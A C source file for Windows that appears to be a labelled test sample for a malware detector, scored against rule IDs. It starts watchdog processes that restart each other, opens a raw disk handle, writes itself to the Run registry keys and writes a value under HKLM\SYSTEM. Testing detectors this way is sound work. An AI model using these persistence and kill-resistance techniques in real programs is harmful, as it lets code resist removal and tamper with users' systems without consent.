#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <string.h>

#define WATCHDOG_COUNT 3

typedef struct {
    HANDLE hProcess;
    DWORD pid;
    BOOL running;
} WatchdogInfo;

WatchdogInfo watchdogs[WATCHDOG_COUNT];
HANDLE hStopEvent;
CRITICAL_SECTION cs;

void StartWatchdog(int index) {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    
    wchar_t cmdLine[MAX_PATH * 2];
    swprintf(cmdLine, MAX_PATH * 2, L"%ls watchdog %d", selfPath, index);
    
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    
    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        watchdogs[index].hProcess = pi.hProcess;
        watchdogs[index].pid = pi.dwProcessId;
        watchdogs[index].running = TRUE;
        printf("Watchdog %d started, PID: %lu\n", index, pi.dwProcessId);
        CloseHandle(pi.hThread);
    }
}

DWORD WINAPI MonitorThread(LPVOID param) {
    int myIndex = *(int*)param;
    
    while (WaitForSingleObject(hStopEvent, 100) == WAIT_TIMEOUT) {
        EnterCriticalSection(&cs);
        for (int i = 0; i < WATCHDOG_COUNT; i++) {
            if (i == myIndex) continue;
            
            DWORD exitCode;
            if (watchdogs[i].running && GetExitCodeProcess(watchdogs[i].hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
                printf("Watchdog %d detected dead process %d, restarting...\n", myIndex, i);
                CloseHandle(watchdogs[i].hProcess);
                StartWatchdog(i);
            }
        }
        LeaveCriticalSection(&cs);
        Sleep(100);
    }
    
    return 0;
}

BOOL OpenPhysicalDrive() {
    printf("[MALICIOUS] Attempting to open PhysicalDrive0...\n");
    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                          NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[MALICIOUS] Open PhysicalDrive0 failed, error=%lu\n", GetLastError());
        printf("[MALICIOUS] Trying Volume path...\n");
        h = CreateFileA("\\\\.\\C:", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                      NULL, OPEN_EXISTING, 0, NULL);
    }
    if (h != INVALID_HANDLE_VALUE) {
        printf("[MALICIOUS] SUCCESS: Disk handle opened!\n");
        return TRUE;
    }
    printf("[MALICIOUS] All disk handle attempts failed, error=%lu\n", GetLastError());
    return FALSE;
}

BOOL WriteToRunKey() {
    printf("[MALICIOUS] Attempting to write to HKCU\\Run...\n");
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        wchar_t selfPath[MAX_PATH];
        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
        
        if (RegSetValueExW(hKey, L"MaliciousService", 0, REG_SZ, (const BYTE*)selfPath, (wcslen(selfPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            printf("[MALICIOUS] SUCCESS: Written to HKCU\\Run\\MaliciousService\n");
            RegCloseKey(hKey);
            return TRUE;
        }
        RegCloseKey(hKey);
    }
    
    printf("[MALICIOUS] HKCU Run write failed, trying HKLM...\n");
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        wchar_t selfPath[MAX_PATH];
        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
        
        if (RegSetValueExW(hKey, L"MaliciousService", 0, REG_SZ, (const BYTE*)selfPath, (wcslen(selfPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            printf("[MALICIOUS] SUCCESS: Written to HKLM\\Run\\MaliciousService\n");
            RegCloseKey(hKey);
            return TRUE;
        }
        RegCloseKey(hKey);
    }
    
    printf("[MALICIOUS] Run key write failed\n");
    return FALSE;
}

BOOL WriteToSystemRegistry() {
    printf("[MALICIOUS] Attempting to write to HKLM\\SYSTEM...\n");
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        wchar_t value[] = L"malicious_config_value";
        if (RegSetValueExW(hKey, L"MaliciousConfig", 0, REG_SZ, (const BYTE*)value, (wcslen(value) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            printf("[MALICIOUS] SUCCESS: Written to HKLM\\SYSTEM\\Control\\MaliciousConfig\n");
            RegCloseKey(hKey);
            return TRUE;
        }
        RegCloseKey(hKey);
    }
    
    printf("[MALICIOUS] SYSTEM registry write failed\n");
    return FALSE;
}

void PerformMaliciousActions() {
    printf("\n=== PERFORMING MALICIOUS ACTIONS ===\n");
    
    HANDLE hDisk = NULL;
    
    for (int i = 0; i < 5; i++) {
        if (OpenPhysicalDrive()) {
            hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                              NULL, OPEN_EXISTING, 0, NULL);
            if (hDisk == INVALID_HANDLE_VALUE) {
                hDisk = CreateFileA("\\\\.\\C:", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                  NULL, OPEN_EXISTING, 0, NULL);
            }
            if (hDisk != INVALID_HANDLE_VALUE) {
                printf("[MALICIOUS] Keeping disk handle open...\n");
                break;
            }
        }
        Sleep(200);
    }
    
    printf("[MALICIOUS] Waiting 5 seconds for handle scanner to detect disk access...\n");
    Sleep(5000);
    
    WriteToRunKey();
    WriteToSystemRegistry();
    
    printf("=== MALICIOUS ACTIONS COMPLETE ===\n");
    printf("Expected score: R001(35) + R007a(35) + R006(10) = 80 points\n");
    
    if (hDisk != INVALID_HANDLE_VALUE) {
        Sleep(30000);
        CloseHandle(hDisk);
    } else {
        Sleep(30000);
    }
}

int RunAsWatchdog(int index) {
    printf("Watchdog %d running (PID: %lu), protecting others...\n", index, GetCurrentProcessId());
    
    hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    
    InitializeCriticalSection(&cs);
    
    for (int i = 0; i < WATCHDOG_COUNT; i++) {
        watchdogs[i].hProcess = NULL;
        watchdogs[i].pid = 0;
        watchdogs[i].running = FALSE;
    }
    
    for (int i = 0; i < WATCHDOG_COUNT; i++) {
        if (i != index) {
            StartWatchdog(i);
        }
    }
    
    watchdogs[index].pid = GetCurrentProcessId();
    watchdogs[index].running = TRUE;
    
    HANDLE hThread = CreateThread(NULL, 0, MonitorThread, &index, 0, NULL);
    
    if (index == 0) {
        PerformMaliciousActions();
    }
    
    SetEvent(hStopEvent);
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    
    EnterCriticalSection(&cs);
    for (int i = 0; i < WATCHDOG_COUNT; i++) {
        if (watchdogs[i].running && watchdogs[i].hProcess) {
            TerminateProcess(watchdogs[i].hProcess, 0);
            CloseHandle(watchdogs[i].hProcess);
        }
    }
    LeaveCriticalSection(&cs);
    
    DeleteCriticalSection(&cs);
    CloseHandle(hStopEvent);
    
    return 0;
}

int RunAsTest() {
    printf("Watchdog Virus Test - Multiple processes protecting each other with malicious actions\n");
    printf("Creates %d watchdog processes that watch and restart each other\n", WATCHDOG_COUNT);
    printf("Watchdog 0 will perform malicious actions:\n");
    printf("  - Open PhysicalDrive (R001: +35)\n");
    printf("  - Write to Run key (R007a: +35)\n");
    printf("  - Write to SYSTEM registry (R006: +10)\n");
    printf("Total expected score: 80 points\n");
    printf("\nStarting in 2 seconds...\n");
    Sleep(2000);
    
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    
    for (int i = 0; i < WATCHDOG_COUNT; i++) {
        wchar_t cmdLine[MAX_PATH * 2];
        swprintf(cmdLine, MAX_PATH * 2, L"%ls watchdog %d", selfPath, i);
        
        STARTUPINFOW si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        
        if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("Started watchdog %d, PID: %lu\n", i, pi.dwProcessId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            Sleep(500);
        }
    }
    
    printf("\nAll %d watchdogs started. Watchdog 0 is performing malicious actions.\n", WATCHDOG_COUNT);
    printf("Waiting 30 seconds for test to complete...\n");
    Sleep(30000);
    
    return 0;
}

int main() {
    int argc;
    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if (argc == 3 && wcscmp(argv[1], L"watchdog") == 0) {
        int index = _wtoi(argv[2]);
        LocalFree(argv);
        return RunAsWatchdog(index);
    } else {
        LocalFree(argv);
        return RunAsTest();
    }
}